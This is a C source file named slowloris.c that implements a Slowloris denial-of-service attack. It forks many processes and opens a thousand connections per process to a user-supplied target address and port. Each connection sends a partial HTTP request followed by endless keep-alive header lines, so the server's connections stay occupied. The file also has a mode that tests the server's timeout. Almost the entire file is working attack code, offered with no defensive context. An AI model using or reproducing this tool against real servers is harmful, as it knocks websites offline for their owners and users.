/*******************************************************************************
 *
 * File Name         : slowloris.c
 * Created By        : Kilian SEZNEC
 * Creation Date     : 
 * Last Change       : 
 * Last Changed By   : 
 * Purpose           : 
 * 
 *******************************************************************************/ 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <signal.h>

#define MAX_LEN 65535

typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;

char header[1024] = "GET /toto HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0 .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n";
char keep_alive[16] = "X-a: b\r\n";
char target[1024] = "";
int port = 80;
int timeout = 10;
int fork_nbr = 50;
int con_nbr = 1000;
int test = 0; // used as boolean
int duration = 600;
int nbr_test = 50; // Test's duration is nbr_test * 10 seconds

int slowloris();
char** str_split(char* , const char);
int test_timeout();

/*
** Entry point. Read the arguments. Arguments format must be <arg>=<value>
*/

int main(int argc, char**argv){
     int i = 1, get_target = 0;
     char** arg;

     for(i; i< argc; i++){
	  arg = str_split(argv[i], '=');

	  if(strcmp(arg[0], "target") == 0){
	       strcpy(target, arg[1]);
	       get_target = 1;

	  }else if(strcmp(arg[0], "test") == 0){
	       if(strcmp(arg[1], "true") == 0){
		    test = 1;
	       }

	  }else if(strcmp(arg[0], "connection") == 0){
	       con_nbr = atoi(arg[1]);

	  }else if(strcmp(arg[0], "timeout") == 0){
	       timeout = atoi(arg[1]);

	  }else if(strcmp(arg[0], "port") == 0){
	       port = atoi(arg[1]);

	  }else if(strcmp(arg[0], "fork") == 0){
	       fork_nbr = atoi(arg[1]);

	  }else if(strcmp(arg[0], "duration") == 0){
	       duration = atoi(arg[1]);

	  }else{
	       printf("Unknown argument: %s\nExiting ...\n", arg[0]);
	       exit(1);
	  }
     }
     
     if(get_target == 0){
	  printf("No target define by target=... \n");
	  exit(1);
     }

     if(test == 0){
	  slowloris();
     }else{
	  test_timeout();
	  printf("Test finished\n");
     }

     return 0;
}

/*
** Execute a Slowloris attack using the parameters defined in the main function
*/ 

int slowloris(){
     int pid, i = 0, j = 0, error = 0, errno;
     SOCKADDR_IN servaddr = { 0 };
     int sock[con_nbr];
     int pids[con_nbr];
     memset(sock, -1, sizeof(sock));

     printf("Target: %s\nPort: %d\nTimeout: %d\nNbr connection: %d\n", target, port, timeout, con_nbr);

     bzero(&servaddr,sizeof(servaddr));
     servaddr.sin_family = AF_INET;
     servaddr.sin_addr.s_addr = inet_addr(target);
     servaddr.sin_port = htons(port);
     
     for(i; i<fork_nbr; i++){
	  pid = fork();
	  if(pid == 0){ // son

	       // sons stay in loop
	       while(1){

		    // create connections
		    for(j = 0; j <con_nbr; j++){
			 // socket
			 if((sock[j] = socket(AF_INET,SOCK_STREAM,0)) == -1){
			      perror("socket()");
			      printf("Socket %d: failed to dreate socket\n", i);
			      exit(errno);
			 }

			 // connect
			 if(connect(sock[j], (SOCKADDR *)&servaddr, sizeof(servaddr)) == -1){
			      perror("connect()");
			      exit(errno);
			 }else{
			      printf("Socket %d: connected to server\n", i);
			 }
	       
			 // send header
			 if(send(sock[j], header, strlen(header), 0) < 0){
			      perror("send()");
			      exit(errno);
			 }else{
			      printf("Socket %d: header send\n", i);
			 }
		    }

		    // send keep alive
		    j = 0;
		    for(j = 0; j <con_nbr; j++){
			 if(send(sock[j], keep_alive, strlen(keep_alive), 0) < 0){
			      perror("send()");
			      exit(errno);
			 }else{
			      printf("Socket %d: keep alive send\n", i);
			 }
		    }
	       }

	       // wait
	       sleep(timeout);
	  
	  }else{
	       pids[i] = pid;
	  }
     }
     
     // the father kill all sons after duration
     sleep(duration);
     i = 0;
     for(i; i < con_nbr; i++){
	  kill (pids[i], SIGKILL);
     }
     return 0;
}

/*
** Test the timeout by sending the first header and keep alive and trying to send an other keep alive few seconds later.
*/

int test_timeout(){
     int pid, i = 0, errno;
     SOCKADDR_IN servaddr = { 0 };
     int sock[nbr_test];
     memset(sock, -1, sizeof(sock));

     bzero(&servaddr,sizeof(servaddr));
     servaddr.sin_family = AF_INET;
     servaddr.sin_addr.s_addr = inet_addr(target);
     servaddr.sin_port = htons(port);

     for(i; i < nbr_test; i++){
	  // socket
	  if((sock[i] = socket(AF_INET,SOCK_STREAM,0)) == -1){
	       perror("socket()");
	       printf("Socket %d: failed to dreate socket\n", i);
	       exit(errno);
	  }

	  // connect
	  if(connect(sock[i], (SOCKADDR *)&servaddr, sizeof(servaddr)) == -1){
	       perror("connect()");
	       exit(errno);
	  }
	       
	  // send header
	  if(send(sock[i], header, strlen(header), 0) < 0){
	       perror("send()");
	       exit(errno);
	  }

	  // send first keep alive
	  if(send(sock[i], keep_alive, strlen(keep_alive), 0) < 0){
	       printf("Data can't be send after %ds\n", i*10);
	       exit(0);
	  }
     }

     i=0;
     for(i; i < nbr_test; i++){
	  if(send(sock[i], keep_alive, strlen(keep_alive), 0) < 0){
	       printf("Data can't be send after %ds\n", i*10);
	       exit(0);
	  }else{
	       printf("Keep alive successfully send after %d\n", i*10);
	  }
	  sleep(10);
     }

     return 0;
}

/*
** Cut a string in a string tab around a specific character
*/

char** str_split(char* a_str, const char a_delim){
     char** result    = 0;
     size_t count     = 0;
     char* tmp        = a_str;
     char* last_comma = 0;
     char delim[2];
     delim[0] = a_delim;
     delim[1] = 0;

     /* Count how many elements will be extracted. */
     while (*tmp)
     {
	  if (a_delim == *tmp)
	  {
	       count++;
	       last_comma = tmp;
	  }
	  tmp++;
     }

     /* Add space for trailing token. */
     count += last_comma < (a_str + strlen(a_str) - 1);

     /* Add space for terminating null string so caller
	knows where the list of returned strings ends. */
     count++;

     result = malloc(sizeof(char*) * count);

     if (result)
     {
	  size_t idx  = 0;
	  char* token = strtok(a_str, delim);

	  while (token)
	  {
	       assert(idx < count);
	       *(result + idx++) = strdup(token);
	       token = strtok(0, delim);
	  }
	  assert(idx == count - 1);
	  *(result + idx) = 0;
     }

     return result;
}
